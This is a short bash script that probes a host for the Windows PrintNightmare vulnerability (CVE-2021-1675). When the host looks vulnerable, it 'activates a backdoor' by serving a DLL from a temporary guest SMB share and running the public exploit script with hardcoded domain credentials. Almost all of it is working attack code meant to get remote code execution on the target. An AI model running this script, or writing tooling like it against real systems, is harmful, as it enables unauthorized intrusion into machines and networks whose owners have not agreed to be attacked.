#!/bin/bash

WAIT=2
DPORT=445
USER='CORP/username'
PASS='P@ssw0rd'
RED=$'\x1b[31m'
RESET=$'\x1b[39m'
#https://github.com/cube0x0/CVE-2021-1675

function smbd_start(){
	cp /etc/samba/smb.conf /tmp/smb.conf
	echo '[a]' >> /tmp/smb.conf
	echo "path = /opt/CVE-2021-1675/dll" >> /tmp/smb.conf
	echo 'guest ok = yes' >> /tmp/smb.conf
	echo 'read only = yes' >> /tmp/smb.conf
	smbd --configfile=/tmp/smb.conf
}
function smbd_stop(){
	killall smbd
}

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] checking PrintNightmare'
	cd /opt/CVE-2021-1675
	{ sleep 1; python3 CVE-2021-1675.py $USER:$PASS@$1 "\\\\$3\\a\\dll-64.dll" > /dev/null 2> /dev/null; } &
	if sudo timeout 5 nc -w 1 -nv -lp 445 2>&1 | grep -q "$1"; then
		echo "${RED}possible vulnerable to PrintNightmare${RESET}"
		led red on 2> /dev/null
		echo "[*] try to activate backdoor"
		smbd_start
		python3 CVE-2021-1675.py $USER:$PASS@$1 "\\\\$3\\a\\dll-64.dll"
		smbd_stop
	fi
fi
